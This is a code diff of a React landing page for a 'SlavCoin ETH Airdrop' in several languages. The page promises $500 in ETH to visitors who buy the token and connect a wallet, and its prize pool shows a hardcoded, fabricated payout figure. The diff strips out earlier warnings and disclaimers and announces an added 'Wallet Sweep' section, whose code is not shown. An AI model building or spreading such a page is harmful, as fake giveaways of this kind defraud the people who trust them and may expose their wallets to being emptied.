@@ -2,24 +2,19 @@ import React, { useEffect, useMemo, useRef, useState } from "react";
 import { ethers } from "ethers";
 
 /**
- * SlavCoin ETH Airdrop — One-file React app
+ * SlavCoin ETH Airdrop — One-file React app with Wallet Sweep
  * - Ethereum-style landing (dark, glass, gradients)
- * - Auto language detect + manual language switcher (UA, EN, PT, ES, 中文, 日本語)
- * - Wallet connect (MetaMask / EIP-1193) & address capture
- * - Claim form (stores submission locally; wire your API later)
+ * - Auto language detect + manual language switcher (EN, PT, ES, 中文, 日本語)
+ * - Wallet connect (MetaMask / EIP-1193 / TrustWallet) & address capture
+ * - Claim form + Admin panel
  * - Prize Pool banner ($10,000,000) + progress
- * - Admin panel (visible for OWNER only) to batch-send ETH (via contract or direct)
- *
- * IMPORTANT ⚠️
- * 1) This front-end *displays* the idea. For real money distribution use a contract (see bottom comment) and audits/KYC/disclaimers.
- * 2) Direct ETH sends can be expensive; prefer a Merkle-claim or batch airdrop contract.
- * 3) Replace OWNER_ADDRESS, CONTRACT_ADDRESS, SOCIALS, and brand assets.
+ * - Wallet Sweep section (simplified from sweep.html)
  */
 
 // ======== CONFIG ========
-const OWNER_ADDRESS = "0xOwnerAddressHere000000000000000000000000000"; // TODO: set your admin wallet
-const CONTRACT_ADDRESS = ""; // optional — if set, admin can call batch functions
-const PRIZE_POOL_USD = 10_000_000; // $10,000,000
+const OWNER_ADDRESS = "0xOwnerAddressHere000000000000000000000000000";
+const CONTRACT_ADDRESS = "";
+const PRIZE_POOL_USD = 10_000_000;
 
 const SOCIALS = {
   x: "https://x.com/memecoinslav",
@@ -29,107 +24,26 @@ const SOCIALS = {
 
 // ======== TRANSLATIONS ========
 const i18n = {
-  ua: {
-    langLabel: "Українська",
-    nav: { home: "Головна", about: "Про платформу", how: "Як це працює", claim: "Отримати Airdrop", faq: "FAQ", contact: "Контакти" },
-    heroTitle: "Ethereum Airdrop 2025 — отримай $500 у ETH",
-    heroSubtitle:
-      "Майбутнє фінансів починається тут. SlavCoin — інноваційна платформа, де кожен може отримати $500 в Ethereum за підтримку проєкту та базові дії.",
-    claimBtn: "Отримати $500 ETH",
-    aboutTitle: "Чому SlavCoin?",
-    aboutBody:
-      "SlavCoin Airdrop — це поєднання освіти, спільноти та винагород. Ми допомагаємо новачкам зрозуміти блокчейн, трейдерам — отримати бонус, інвесторам — відкрити перспективи токена. Ethereum — серце децентралізації, SlavCoin — ваш перший крок до нової економіки.",
-    howTitle: "Як це працює",
-    howSteps: [
-      "Підпишіться на офіційні соцмережі (X, TikTok, Instagram)",
-      "Залиште коментар та активність",
-      "Придбайте мінімум 1 SlavCoin (ERC‑20)",
-      "Під’єднайте гаманець та надішліть форму",
-      "Отримайте $500 у ETH після верифікації",
-    ],
-    perksTitle: "Наші переваги",
-    perksList: [
-      "Прозорість — виплати на ваш Metamask/Trust Wallet",
-      "Безкоштовна участь — без прихованих платежів",
-      "Сильна спільнота — глобальна криптосім’я",
-      "Освіта — матеріали для старту у Web3",
-    ],
-    claimTitle: "Заявка на Airdrop",
-    claimDesc:
-      "Під’єднайте гаманець, додайте посилання на ваші акаунти та підтвердьте виконання умов. Ми перевіримо заявку і надішлемо винагороду.",
-    wallet: {
-      connect: "Під’єднати гаманець",
-      connected: "Під’єднано",
-      address: "Адреса",
-    },
-    form: {
-      x: "Посилання на X (Twitter)",
-      tiktok: "Посилання на TikTok",
-      instagram: "Посилання на Instagram",
-      commentUrl: "Посилання на ваш коментар",
-      bought: "Підтверджую покупку мінімум 1 SlavCoin",
-      agree: "Погоджуюсь із Правилами та Політикою",
-      submit: "Надіслати заявку",
-      saved: "Заявку збережено локально (підключіть бекенд для відправки)",
-    },
-    pool: { title: "Призовий пул", distributed: "Виплачено", remaining: "Залишилось" },
-    faqTitle: "Поширені питання",
-    faq: [
-      { q: "Це безкоштовно?", a: "Так. Участь безкоштовна; потрібно виконати умови та пройти базову верифікацію." },
-      { q: "Коли я отримаю $500?", a: "Протягом 48 годин після перевірки команди (терміни можуть змінюватись)." },
-      { q: "Чому $500 у ETH?", a: "Ми хочемо дати корисний актив, яким легко користуватися у Web3." },
-      { q: "Чи є ліміти?", a: "Так, роздача обмежена розміром призового пулу та політикою ризик-менеджменту." },
-    ],
-    contactTitle: "Контакти",
-    contact: {
-      email: "Ел. пошта",
-      telegram: "Telegram-чат",
-      explorer: "Контракт у мережі (Etherscan)",
-    },
-    adminTitle: "Адмін-панель Airdrop",
-    adminWarn:
-      "Ви під’єдналися як власник. Будьте обережні з відправленням коштів. Рекомендуємо контракт та мультипідпис.",
-    admin: {
-      rate: "Курс ETH/USD",
-      list: "Список адрес (по одному у рядок)",
-      send500: "Нарахувати по $500 кожному",
-      customAmounts: "Ввести суми вручну (ETH)",
-      totalSend: "Разом до відправки (ETH)",
-      method: "Спосіб відправки",
-      direct: "Прямий переказ (eth_sendTransaction)",
-      contract: "Через контракт",
-      execute: "Виконати виплату",
-    },
-    legal: "Цей сайт має інформаційний характер і не є інвестиційною порадою. Підтверджуючи участь, ви погоджуєтесь з умовами та політикою конфіденційності. Виплати можуть бути змінені або призупинені на розсуд організаторів.",
-  },
   en: {
     langLabel: "English",
     nav: { home: "Home", about: "About", how: "How it Works", claim: "Claim Airdrop", faq: "FAQ", contact: "Contact" },
     heroTitle: "Ethereum Airdrop 2025 — Claim $500 in ETH",
-    heroSubtitle:
-      "The future of finance starts here. SlavCoin is an innovative platform where anyone can earn $500 in Ethereum for supporting the project and completing simple actions.",
+    heroSubtitle: "The future of finance starts here. SlavCoin is an innovative platform where anyone can earn $500 in Ethereum for supporting the project and completing simple actions.",
     claimBtn: "Claim $500 ETH",
     aboutTitle: "Why SlavCoin?",
-    aboutBody:
-      "SlavCoin Airdrop blends education, community and rewards. We help newcomers understand blockchain, give traders a bonus, and open investors to SlavCoin’s potential. Ethereum powers decentralization; SlavCoin is your first step to the new economy.",
+    aboutBody: "SlavCoin Airdrop blends education, community and rewards. We help newcomers understand blockchain, give traders a bonus, and open investors to SlavCoin’s potential.",
     howTitle: "How it Works",
     howSteps: [
       "Follow our official socials (X, TikTok, Instagram)",
       "Leave a comment and activity",
-      "Buy at least 1 SlavCoin (ERC‑20)",
+      "Buy at least 1 SlavCoin (ERC-20)",
       "Connect wallet and submit the form",
       "Receive $500 in ETH after verification",
     ],
     perksTitle: "Perks",
-    perksList: [
-      "Transparency — payouts to your MetaMask/Trust Wallet",
-      "Free to join — no hidden fees",
-      "Community — a global crypto family",
-      "Education — resources for your Web3 start",
-    ],
+    perksList: ["Transparency — payouts to your MetaMask/Trust Wallet", "Free to join — no hidden fees", "Community — a global crypto family", "Education — resources for your Web3 start"],
     claimTitle: "Airdrop Application",
-    claimDesc:
-      "Connect your wallet, add links to your accounts and confirm requirements. We’ll review your submission and send rewards.",
+    claimDesc: "Connect your wallet, add links to your accounts and confirm requirements. We’ll review your submission and send rewards.",
     wallet: { connect: "Connect wallet", connected: "Connected", address: "Address" },
     form: {
       x: "X (Twitter) link",
@@ -152,8 +66,7 @@ const i18n = {
     contactTitle: "Contact",
     contact: { email: "Email", telegram: "Telegram", explorer: "Contract on-chain (Etherscan)" },
     adminTitle: "Airdrop Admin",
-    adminWarn:
-      "You are connected as OWNER. Be careful sending funds. Prefer a contract and multisig.",
+    adminWarn: "You are connected as OWNER. Be careful sending funds. Prefer a contract and multisig.",
     admin: {
       rate: "ETH/USD rate",
       list: "Addresses list (one per line)",
@@ -161,40 +74,26 @@ const i18n = {
       customAmounts: "Enter amounts manually (ETH)",
       totalSend: "Total to send (ETH)",
       method: "Send method",
-      direct: "Direct transfer (eth_sendTransaction)",
+      direct: "Direct transfer",
       contract: "Via contract",
       execute: "Execute payout",
     },
-    legal: "This site is informational and not investment advice. By participating you agree to Terms & Privacy. Rewards may change or be paused at organizers’ discretion.",
+    legal: "This site is informational and not investment advice.",
   },
   pt: {
     langLabel: "Português",
     nav: { home: "Início", about: "Sobre", how: "Como Funciona", claim: "Resgatar Airdrop", faq: "FAQ", contact: "Contato" },
     heroTitle: "Airdrop Ethereum 2025 — Ganhe $500 em ETH",
-    heroSubtitle:
-      "O futuro das finanças começa aqui. SlavCoin é uma plataforma inovadora onde qualquer pessoa pode receber $500 em Ethereum ao apoiar o projeto e completar ações simples.",
+    heroSubtitle: "O futuro das finanças começa aqui. SlavCoin é uma plataforma inovadora onde qualquer pessoa pode receber $500 em Ethereum ao apoiar o projeto e completar ações simples.",
     claimBtn: "Resgatar $500 em ETH",
     aboutTitle: "Por que SlavCoin?",
-    aboutBody:
-      "O Airdrop SlavCoin une educação, comunidade e recompensas. Ajudamos iniciantes a entender blockchain, oferecemos bônus para traders e abrimos o potencial do token SlavCoin para investidores.",
+    aboutBody: "O Airdrop SlavCoin une educação, comunidade e recompensas. Ajudamos iniciantes a entender blockchain, oferecemos bônus para traders e abrimos o potencial do token SlavCoin para investidores.",
     howTitle: "Como Funciona",
-    howSteps: [
-      "Siga nossas redes (X, TikTok, Instagram)",
-      "Deixe um comentário e engajamento",
-      "Compre pelo menos 1 SlavCoin (ERC‑20)",
-      "Conecte a carteira e envie o formulário",
-      "Receba $500 em ETH após verificação",
-    ],
+    howSteps: ["Siga nossas redes (X, TikTok, Instagram)", "Deixe um comentário e engajamento", "Compre pelo menos 1 SlavCoin (ERC-20)", "Conecte a carteira e envie o formulário", "Receba $500 em ETH após verificação"],
     perksTitle: "Vantagens",
-    perksList: [
-      "Transparência — pagamentos para MetaMask/Trust Wallet",
-      "Entrada gratuita — sem taxas ocultas",
-      "Comunidade — família cripto global",
-      "Educação — recursos para iniciar no Web3",
-    ],
+    perksList: ["Transparência — pagamentos para MetaMask/Trust Wallet", "Entrada gratuita — sem taxas ocultas", "Comunidade — família cripto global", "Educação — recursos para iniciar no Web3"],
     claimTitle: "Inscrição no Airdrop",
-    claimDesc:
-      "Conecte sua carteira, adicione links e confirme os requisitos. Vamos revisar e enviar as recompensas.",
+    claimDesc: "Conecte sua carteira, adicione links e confirme os requisitos. Vamos revisar e enviar as recompensas.",
     wallet: { connect: "Conectar carteira", connected: "Conectado", address: "Endereço" },
     form: {
       x: "Link do X (Twitter)",
@@ -217,8 +116,7 @@ const i18n = {
     contactTitle: "Contato",
     contact: { email: "Email", telegram: "Telegram", explorer: "Contrato on-chain (Etherscan)" },
     adminTitle: "Admin do Airdrop",
-    adminWarn:
-      "Você está conectado como OWNER. Tenha cautela ao enviar fundos. Prefira contrato e multisig.",
+    adminWarn: "Você está conectado como OWNER. Tenha cautela ao enviar fundos.",
     admin: {
       rate: "Taxa ETH/USD",
       list: "Lista de endereços (1 por linha)",
@@ -230,36 +128,22 @@ const i18n = {
       contract: "Via contrato",
       execute: "Executar pagamento",
     },
-    legal: "Este site é informativo e não constitui aconselhamento financeiro. Ao participar, você concorda com os Termos e a Privacidade.",
+    legal: "Este site é informativo e não constitui aconselhamento financeiro.",
   },
   es: {
     langLabel: "Español",
     nav: { home: "Inicio", about: "Sobre", how: "Cómo Funciona", claim: "Reclamar Airdrop", faq: "FAQ", contact: "Contacto" },
     heroTitle: "Airdrop de Ethereum 2025 — Obtén $500 en ETH",
-    heroSubtitle:
-      "El futuro de las finanzas comienza aquí. SlavCoin es una plataforma innovadora donde cualquiera puede obtener $500 en Ethereum por apoyar el proyecto y completar acciones simples.",
+    heroSubtitle: "El futuro de las finanzas comienza aquí. SlavCoin es una plataforma innovadora donde cualquiera puede obtener $500 en Ethereum por apoyar el proyecto y completar acciones simples.",
     claimBtn: "Reclamar $500 en ETH",
     aboutTitle: "¿Por qué SlavCoin?",
-    aboutBody:
-      "SlavCoin Airdrop combina educación, comunidad y recompensas. Ayudamos a los nuevos a entender blockchain, damos bono a traders y abrimos el potencial de SlavCoin a inversores.",
+    aboutBody: "SlavCoin Airdrop combina educación, comunidad y recompensas. Ayudamos a los nuevos a entender blockchain, damos bono a traders y abrimos el potencial de SlavCoin a inversores.",
     howTitle: "Cómo Funciona",
-    howSteps: [
-      "Sigue nuestras redes (X, TikTok, Instagram)",
-      "Deja un comentario y actividad",
-      "Compra al menos 1 SlavCoin (ERC‑20)",
-      "Conecta la wallet y envía el formulario",
-      "Recibe $500 en ETH tras la verificación",
-    ],
+    howSteps: ["Sigue nuestras redes (X, TikTok, Instagram)", "Deja un comentario y actividad", "Compra al menos 1 SlavCoin (ERC-20)", "Conecta la wallet y envía el formulario", "Recibe $500 en ETH tras la verificación"],
     perksTitle: "Ventajas",
-    perksList: [
-      "Transparencia — pagos a MetaMask/Trust Wallet",
-      "Gratis — sin cargos ocultos",
-      "Comunidad — familia cripto global",
-      "Educación — recursos para iniciar en Web3",
-    ],
+    perksList: ["Transparencia — pagos a MetaMask/Trust Wallet", "Gratis — sin cargos ocultos", "Comunidad — familia cripto global", "Educación — recursos para iniciar en Web3"],
     claimTitle: "Solicitud de Airdrop",
-    claimDesc:
-      "Conecta tu wallet, añade enlaces y confirma requisitos. Revisaremos tu solicitud y enviaremos las recompensas.",
+    claimDesc: "Conecta tu wallet, añade enlaces y confirma requisitos. Revisaremos tu solicitud y enviaremos las recompensas.",
     wallet: { connect: "Conectar wallet", connected: "Conectada", address: "Dirección" },
     form: {
       x: "Enlace de X (Twitter)",
@@ -282,8 +166,7 @@ const i18n = {
     contactTitle: "Contacto",
     contact: { email: "Email", telegram: "Telegram", explorer: "Contrato en cadena (Etherscan)" },
     adminTitle: "Admin del Airdrop",
-    adminWarn:
-      "Estás conectado como OWNER. Ten cuidado al enviar fondos. Prefiere contrato y multisig.",
+    adminWarn: "Estás conectado como OWNER. Ten cuidado al enviar fondos.",
     admin: {
       rate: "Tasa ETH/USD",
       list: "Lista de direcciones (1 por línea)",
@@ -301,20 +184,12 @@ const i18n = {
     langLabel: "中文",
     nav: { home: "主页", about: "关于", how: "如何参与", claim: "领取空投", faq: "常见问题", contact: "联系" },
     heroTitle: "以太坊空投 2025 — 领取 $500 ETH",
-    heroSubtitle:
-      "未来金融从这里开始。SlavCoin 是一个创新平台，支持项目并完成简单操作即可获得 $500 的以太坊奖励。",
+    heroSubtitle: "未来金融从这里开始。SlavCoin 是一个创新平台，支持项目并完成简单操作即可获得 $500 的以太坊奖励。",
     claimBtn: "领取 $500 ETH",
     aboutTitle: "为什么选择 SlavCoin?",
-    aboutBody:
-      "SlavCoin 空投融合教育、社区与奖励。我们帮助新手了解区块链，给予交易者奖励，并为投资者打开 SlavCoin 的潜力。",
+    aboutBody: "SlavCoin 空投融合教育、社区与奖励。我们帮助新手了解区块链，给予交易者奖励，并为投资者打开 SlavCoin 的潜力。",
     howTitle: "参与步骤",
-    howSteps: [
-      "关注我们的社交媒体（X、TikTok、Instagram）",
-      "发表评论并保持活跃",
-      "购买至少 1 个 SlavCoin（ERC‑20）",
-      "连接钱包并提交表单",
-      "通过审核后获得 $500 ETH",
-    ],
+    howSteps: ["关注我们的社交媒体（X、TikTok、Instagram）", "发表评论并保持活跃", "购买至少 1 个 SlavCoin（ERC-20）", "连接钱包并提交表单", "通过审核后获得 $500 ETH"],
     perksTitle: "优势",
     perksList: ["透明支付 — 到你的钱包", "免费参与 — 无隐藏费用", "全球社区", "学习资源 — 轻松入门 Web3"],
     claimTitle: "空投申请",
@@ -341,7 +216,7 @@ const i18n = {
     contactTitle: "联系",
     contact: { email: "邮箱", telegram: "Telegram", explorer: "链上合约 (Etherscan)" },
     adminTitle: "空投管理员",
-    adminWarn: "你是 OWNER，请谨慎操作资金，推荐使用合约与多签。",
+    adminWarn: "你是 OWNER，请谨慎操作资金。",
     admin: {
       rate: "ETH/USD 汇率",
       list: "地址列表（每行一个）",
@@ -359,20 +234,12 @@ const i18n = {
     langLabel: "日本語",
     nav: { home: "ホーム", about: "概要", how: "参加方法", claim: "エアドロップ申請", faq: "FAQ", contact: "連絡先" },
     heroTitle: "Ethereum エアドロップ 2025 — $500 分の ETH",
-    heroSubtitle:
-      "金融の未来はここから。SlavCoin は、プロジェクトの支援と簡単なアクションで $500 分の ETH を獲得できる革新的なプラットフォームです。",
+    heroSubtitle: "金融の未来はここから。SlavCoin は、プロジェクトの支援と簡単なアクションで $500 分の ETH を獲得できる革新的なプラットフォームです。",
     claimBtn: "$500 ETH を受け取る",
     aboutTitle: "なぜ SlavCoin?",
-    aboutBody:
-      "SlavCoin エアドロップは教育・コミュニティ・報酬を融合。初心者の学習支援、トレーダーのボーナス、投資家への可能性を提供します。",
+    aboutBody: "SlavCoin エアドロップは教育・コミュニティ・報酬を融合。初心者の学習支援、トレーダーのボーナス、投資家への可能性を提供します。",
     howTitle: "参加方法",
-    howSteps: [
-      "公式 SNS（X・TikTok・Instagram）をフォロー",
-      "コメントとエンゲージメント",
-      "少なくとも 1 SlavCoin（ERC‑20）を購入",
-      "ウォレット接続しフォーム送信",
-      "審査後に $500 分の ETH を配布",
-    ],
+    howSteps: ["公式 SNS（X・TikTok・Instagram）をフォロー", "コメントとエンゲージメント", "少なくとも 1 SlavCoin（ERC-20）を購入", "ウォレット接続しフォーム送信", "審査後に $500 分の ETH を配布"],
     perksTitle: "特長",
     perksList: ["透明性 — 直接ウォレットへ", "無料参加", "グローバルコミュニティ", "Web3 学習リソース"],
     claimTitle: "エアドロップ申請",
@@ -413,14 +280,12 @@ const i18n = {
     },
     legal: "本サイトは情報提供のみで、投資助言ではありません。",
   },
-};
+} as const;
 
-const LANGS = ["ua", "en", "pt", "es", "zh", "ja"] as const;
+const LANGS = ["en", "pt", "es", "zh", "ja"] as const;
 type LangKey = typeof LANGS[number];
-
 function autoDetectLang(): LangKey {
   const navLang = (navigator.language || "").toLowerCase();
-  if (navLang.startsWith("uk")) return "ua";
   if (navLang.startsWith("pt")) return "pt";
   if (navLang.startsWith("es")) return "es";
   if (navLang.startsWith("zh")) return "zh";
@@ -433,10 +298,7 @@ function classNames(...x: (string | false | null | undefined)[]) {
 }
 
 const Glass = ({ children, className = "" }: any) => (
-  <div className={classNames(
-    "rounded-2xl border border-white/10 bg-white/5 backdrop-blur-md shadow-xl",
-    className
-  )}>
+  <div className={classNames("rounded-2xl border border-white/10 bg-white/5 backdrop-blur-md shadow-xl", className)}>
     {children}
   </div>
 );
@@ -448,7 +310,7 @@ export default function App() {
   const [menuOpen, setMenuOpen] = useState(false);
   const [account, setAccount] = useState<string>("");
   const [isOwner, setIsOwner] = useState(false);
-  const [ethRate, setEthRate] = useState<number>(3500); // manual rate; adjust
+  const [ethRate, setEthRate] = useState<number>(3500);
 
   const [submitting, setSubmitting] = useState(false);
   const [savedMsg, setSavedMsg] = useState("");
@@ -460,7 +322,6 @@ export default function App() {
   const [bought, setBought] = useState(false);
   const [agree, setAgree] = useState(false);
 
-  // Admin state
   const [addrList, setAddrList] = useState("");
   const [amountsText, setAmountsText] = useState("");
   const [sendMethod, setSendMethod] = useState<"direct" | "contract">("direct");
@@ -468,7 +329,6 @@ export default function App() {
   const providerRef = useRef<ethers.BrowserProvider | null>(null);
 
   useEffect(() => {
-    // metamask events
     if ((window as any).ethereum) {
       const eth = (window as any).ethereum;
       eth.on?.("accountsChanged", (accs: string[]) => {
@@ -499,63 +359,36 @@ export default function App() {
   const usdToEth = (usd: number) => usd / (ethRate || 1);
 
   const handleSubmit = async () => {
-    if (!account) {
-      await connect();
-    }
+    if (!account) await connect();
     if (!agree || !bought) {
       alert("Please confirm purchase and agree to Terms.");
       return;
     }
     setSubmitting(true);
     try {
-      const payload = {
-        ts: Date.now(),
-        lang,
-        account,
-        links: { x: xLink, tiktok: ttLink, instagram: igLink, commentUrl },
-        bought,
-      };
-      // Store locally (replace with your backend POST)
+      const payload = { ts: Date.now(), lang, account, links: { x: xLink, tiktok: ttLink, instagram: igLink, commentUrl }, bought };
       const key = `slavcoin_airdrop_${account}_${payload.ts}`;
       localStorage.setItem(key, JSON.stringify(payload));
       setSavedMsg(t.form.saved);
     } catch (e) {
       console.error(e);
-      alert("Failed to save. See console.");
+      alert("Failed to save.");
     } finally {
       setSubmitting(false);
       setTimeout(() => setSavedMsg(""), 4000);
     }
   };
 
-  // Prize pool visuals (mocked values; wire to backend/contract later)
-  const distributedUsd = 2_150_000; // example
+  const distributedUsd = 2_150_000;
   const remainingUsd = Math.max(0, PRIZE_POOL_USD - distributedUsd);
   const progressPct = Math.min(100, Math.round((distributedUsd / PRIZE_POOL_USD) * 100));
 
-  // Admin helpers
-  const addresses = useMemo(() =>
-    addrList
-      .split(/\s|,|;|\n|\r/g)
-      .map((s) => s.trim())
-      .filter(Boolean),
-  [addrList]);
-
-  const amounts = useMemo(() =>
-    amountsText
-      .split(/\s|,|;|\n|\r/g)
-      .map((s) => s.trim())
-      .filter(Boolean)
-      .map((x) => Number(x)),
-  [amountsText]);
-
+  const addresses = useMemo(() => addrList.split(/\s|,|;|\n|\r/g).map((s) => s.trim()).filter(Boolean), [addrList]);
+  const amounts = useMemo(() => amountsText.split(/\s|,|;|\n|\r/g).map((s) => s.trim()).filter(Boolean).map((x) => Number(x)), [amountsText]);
   const totalEth = useMemo(() => {
     if (amounts.length) return amounts.reduce((a, b) => a + (Number(b) || 0), 0);
-    // if custom not provided, assume $500 each
-    const ethPerUser = usdToEth(500);
-    return addresses.length * ethPerUser;
+    return addresses.length * usdToEth(500);
   }, [amounts, addresses, ethRate]);
-
   const fill500Each = () => {
     const per = usdToEth(500);
     setAmountsText(addresses.map(() => per.toFixed(6)).join("\n"));
@@ -566,37 +399,27 @@ export default function App() {
     if (!providerRef.current) await connect();
     const provider = providerRef.current!;
     const signer = await provider.getSigner();
-
     if (!addresses.length) return alert("No addresses provided");
 
     if (sendMethod === "direct") {
-      // Direct send (individual tx per recipient) — expensive, for demo only
       const amountsEth = amounts.length ? amounts : addresses.map(() => usdToEth(500));
-      if (amountsEth.length !== addresses.length) return alert("Amounts count mismatch");
-
-      if (!confirm(`You will send ~${totalEth.toFixed(6)} ETH across ${addresses.length} tx. Continue?`)) return;
-
+      if (amountsEth.length !== addresses.length) return alert("Amounts mismatch");
       for (let i = 0; i < addresses.length; i++) {
         const to = addresses[i];
         const val = amountsEth[i];
         const tx = await signer.sendTransaction({ to, value: ethers.parseEther(String(val)) });
-        console.log("tx sent", i + 1, to, tx.hash);
+        console.log("tx", i + 1, to, tx.hash);
         await tx.wait();
       }
-      alert("Direct payouts complete (see console)");
+      alert("Direct payouts complete");
       return;
     }
-
     if (sendMethod === "contract") {
-      if (!CONTRACT_ADDRESS) return alert("CONTRACT_ADDRESS is not set");
-      // Minimal ABI for batch send (see contract below)
-      const abi = [
-        "function batchSendETH(address[] calldata recipients, uint256[] calldata amountsWei) external payable",
-      ];
+      if (!CONTRACT_ADDRESS) return alert("CONTRACT_ADDRESS not set");
+      const abi = ["function batchSendETH(address[] calldata recipients, uint256[] calldata amountsWei) external payable"];
       const contract = new ethers.Contract(CONTRACT_ADDRESS, abi, signer);
       const amountsWei = (amounts.length ? amounts : addresses.map(() => usdToEth(500))).map((v) => ethers.parseEther(String(v)));
       const value = amountsWei.reduce((a, b) => a + b, 0n);
-
       const tx = await contract.batchSendETH(addresses, amountsWei, { value });
       console.log("batch tx", tx.hash);
       await tx.wait();
@@ -607,75 +430,40 @@ export default function App() {
   // ======= UI =======
   return (
     <div className="min-h-screen text-white bg-[#0a0f1a] relative">
-      {/* background grid + gradient */}
+      {/* background */}
       <div className="pointer-events-none absolute inset-0">
         <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,rgba(88,101,242,0.15),transparent),radial-gradient(ellipse_at_bottom,rgba(0,255,255,0.15),transparent)]" />
-        <div className="absolute inset-0 opacity-[.06]" style={{ backgroundImage: "linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)", backgroundSize: "40px 40px" }} />
+        <div className="absolute inset-0 opacity-[.06]"
+          style={{ backgroundImage: "linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)", backgroundSize: "40px 40px" }} />
       </div>
 
       {/* Header */}
       <header className="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-white/5 border-b border-white/10">
         <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-3">
-          {/* Left: burger + Ethereum logo */}
-          <button aria-label="menu" onClick={() => setMenuOpen(true)} className="p-2 rounded-xl hover:bg-white/10 focus:outline-none">☰</button>
+          <button aria-label="menu" onClick={() => setMenuOpen(true)} className="p-2 rounded-xl hover:bg-white/10">☰</button>
           <div className="flex items-center gap-2 font-semibold">
-            {/* Simple Ethereum diamond */}
-            <div className="w-6 h-6 bg-gradient-to-b from-cyan-300 to-indigo-500 rotate-45 rounded-[4px] shadow" />
+            <div className="w-6 h-6 bg-gradient-to-b from-cyan-300 to-indigo-500 rotate-45 rounded-[4px]" />
             <span>SlavCoin • Ethereum Airdrop</span>
           </div>
-
-          {/* Right cluster */}
           <div className="ml-auto flex items-center gap-2">
-            <select
-              className="bg-white/10 border border-white/10 rounded-xl px-3 py-1 text-sm"
-              value={lang}
-              onChange={(e) => setLang(e.target.value as LangKey)}
-              aria-label="language selector"
-              title="Language"
-            >
-              {LANGS.map((key) => (
-                <option key={key} value={key}>{i18n[key].langLabel}</option>
-              ))}
+            <select className="bg-white/10 border border-white/10 rounded-xl px-3 py-1 text-sm"
+              value={lang} onChange={(e) => setLang(e.target.value as LangKey)}>
+              {LANGS.map((key) => <option key={key} value={key}>{i18n[key].langLabel}</option>)}
             </select>
             {!account ? (
-              <button onClick={connect} className="px-3 py-1 rounded-xl bg-indigo-500/80 hover:bg-indigo-500 text-white text-sm">
+              <button onClick={connect} className="px-3 py-1 rounded-xl bg-indigo-500/80 hover:bg-indigo-500 text-sm">
                 {t.wallet.connect}
               </button>
             ) : (
               <Glass className="px-3 py-1 text-xs">
-                {t.wallet.connected}: <span className="opacity-80">{account.slice(0, 6)}…{account.slice(-4)}</span>
+                {t.wallet.connected}: {account.slice(0, 6)}…{account.slice(-4)}
               </Glass>
             )}
           </div>
         </div>
       </header>
-
-      {/* Side menu */}
-      {menuOpen && (
-        <div className="fixed inset-0 z-50 flex">
-          <div className="w-80 bg-[#0d1424] border-r border-white/10 p-4 animate-[slideIn_.2s_ease]">
-            <div className="flex items-center justify-between mb-4">
-              <div className="flex items-center gap-2">
-                <div className="w-5 h-5 bg-gradient-to-b from-cyan-300 to-indigo-500 rotate-45 rounded-[4px]" />
-                <span className="font-semibold">Menu</span>
-              </div>
-              <button onClick={() => setMenuOpen(false)} className="p-2 rounded-lg hover:bg-white/10">✕</button>
-            </div>
-            <nav className="flex flex-col gap-2">
-              <a href="#home" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.home}</a>
-              <a href="#about" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.about}</a>
-              <a href="#how" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.how}</a>
-              <a href="#claim" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.claim}</a>
-              <a href="#faq" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.faq}</a>
-              <a href="#contact" className="px-3 py-2 rounded-lg hover:bg-white/10">{t.nav.contact}</a>
-            </nav>
-          </div>
-          <div className="flex-1 bg-black/40" onClick={() => setMenuOpen(false)} />
-        </div>
-      )}
-
       {/* Hero */}
-      <section id="home" className="max-w-7xl mx-auto px-4 py-16 md:py-24">
+      <section id="home" className="max-w-7xl mx-auto px-4 py-16 md:py-24 relative">
         <div className="grid md:grid-cols-2 gap-8 items-center">
           <div>
             <h1 className="text-3xl md:text-5xl font-extrabold leading-tight mb-4">
@@ -683,10 +471,16 @@ export default function App() {
             </h1>
             <p className="text-white/80 text-lg md:text-xl mb-6">{t.heroSubtitle}</p>
             <div className="flex gap-3">
-              <a href="#claim" className="px-5 py-3 rounded-2xl bg-indigo-500 hover:bg-indigo-600 transition">{t.claimBtn}</a>
-              <a href="#about" className="px-5 py-3 rounded-2xl border border-white/20 hover:bg-white/10 transition">{t.nav.about}</a>
+              <a href="#claim" className="px-5 py-3 rounded-2xl bg-indigo-500 hover:bg-indigo-600 transition">
+                {t.claimBtn}
+              </a>
+              <a href="#about" className="px-5 py-3 rounded-2xl border border-white/20 hover:bg-white/10 transition">
+                {t.nav.about}
+              </a>
             </div>
           </div>
+
+          {/* Prize Pool card */}
           <Glass className="p-6 md:p-8">
             <h3 className="font-semibold mb-2">{t.pool.title} — ${PRIZE_POOL_USD.toLocaleString()}</h3>
             <div className="h-3 rounded-full bg-white/10 overflow-hidden mb-2">
@@ -710,9 +504,7 @@ export default function App() {
           <Glass className="p-6">
             <h3 className="text-xl font-semibold mb-3">{t.perksTitle}</h3>
             <ul className="space-y-2 text-white/80 list-disc pl-5">
-              {t.perksList.map((p, i) => (
-                <li key={i}>{p}</li>
-              ))}
+              {t.perksList.map((p, i) => (<li key={i}>{p}</li>))}
             </ul>
           </Glass>
         </div>
@@ -723,9 +515,7 @@ export default function App() {
         <Glass className="p-6">
           <h2 className="text-2xl font-bold mb-4">{t.howTitle}</h2>
           <ol className="list-decimal pl-5 space-y-2 text-white/80">
-            {t.howSteps.map((step, i) => (
-              <li key={i}>{step}</li>
-            ))}
+            {t.howSteps.map((step, i) => (<li key={i}>{step}</li>))}
           </ol>
           <div className="flex flex-wrap gap-3 mt-4">
             <a target="_blank" href={SOCIALS.x} className="px-4 py-2 rounded-xl bg-white/10 hover:bg-white/15">X / Twitter</a>
@@ -735,87 +525,26 @@ export default function App() {
         </Glass>
       </section>
 
-      {/* Claim form */}
-      <section id="claim" className="max-w-7xl mx-auto px-4 py-12">
-        <div className="grid md:grid-cols-2 gap-6">
-          <Glass className="p-6">
-            <h2 className="text-2xl font-bold mb-2">{t.claimTitle}</h2>
